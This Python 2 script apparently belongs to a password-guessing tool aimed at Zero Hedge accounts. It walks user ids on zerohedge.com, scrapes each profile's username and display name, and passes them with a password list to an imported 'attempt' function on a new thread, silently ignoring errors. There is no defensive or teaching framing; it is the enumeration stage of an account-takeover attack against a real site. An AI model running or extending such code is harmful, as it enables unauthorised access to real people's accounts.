import threading
import urllib2
from attempt import *

def evaluate(number, passwords):
	try:
		entry = [number]
		request = urllib2.Request("http://www.zerohedge.com/user/" + \
			str(number))
		response = urllib2.urlopen(request).read()
		entry.append(response[response.index("canonical") + \
			48:response.index("revisit-after") - 17])
		entry.append(response[response.index("<title>") + \
			7:response.index(" | Zero Hedge")])
		threading.Thread(target=attempt,
			args=(entry, passwords)).start()
	except Exception as error: pass
